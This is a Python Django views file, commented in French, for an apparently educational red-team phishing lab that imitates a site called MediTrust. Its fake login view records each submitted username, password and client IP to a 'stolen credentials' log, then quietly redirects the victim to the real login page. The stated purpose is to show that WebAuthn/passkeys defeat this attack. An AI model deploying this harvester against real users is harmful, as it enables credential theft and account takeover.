"""
Vue du faux site de connexion (simulation Red Team - Phishing).

Scenario :
1. La victime arrive ici (ex: via un lien envoye dans un faux email, ou en
   tapant une URL ressemblant au vrai site), pensant etre sur le vrai
   MediTrust.
2. Le formulaire a exactement la meme apparence que /login/ sur le vrai
   site (meme CSS), mais il n'appelle PAS l'API officielle.
3. A la soumission, ce serveur (cote "attaquant") enregistre les
   identifiants tapes dans un fichier log, PUIS redirige la victime vers
   le vrai site de connexion. Elle devra retaper ses identifiants - dans
   cette version "simple" du phishing, c'est le prix a payer pour rester
   facile a construire (voir le README pour la variante "relais
   transparent", plus difficile a detecter, qui ne demande pas de
   re-authentification a la victime).

Objectif pedagogique : demontrer qu'une page visuellement identique mais
servie depuis une autre origine (ici un port different, dans la vraie vie
un autre nom de domaine) suffit a voler des identifiants - ET montrer,
plus tard, que WebAuthn/Passkeys bloque cette attaque car le navigateur
refuse d'utiliser la passkey sur une origine qui ne correspond pas a celle
enregistree.
"""

import datetime

from django.conf import settings
from django.shortcuts import redirect, render


def get_client_ip(request) -> str:
    return request.META.get("REMOTE_ADDR", "unknown")


def log_stolen_credentials(username: str, password: str, ip: str) -> None:
    timestamp = datetime.datetime.now().isoformat(timespec="seconds")
    line = f"{timestamp} | ip={ip} | username={username} | password={password}\n"
    with open(settings.STOLEN_CREDENTIALS_LOG, "a", encoding="utf-8") as f:
        f.write(line)


def fake_login_view(request):
    if request.method == "POST":
        username = request.POST.get("username", "")
        password = request.POST.get("password", "")
        ip = get_client_ip(request)

        log_stolen_credentials(username, password, ip)

        # La victime ne voit jamais de message d'erreur : elle est
        # simplement renvoyee vers le vrai site, comme si de rien n'etait.
        return redirect(settings.REAL_SITE_LOGIN_URL)

    return render(request, "fake_login.html")
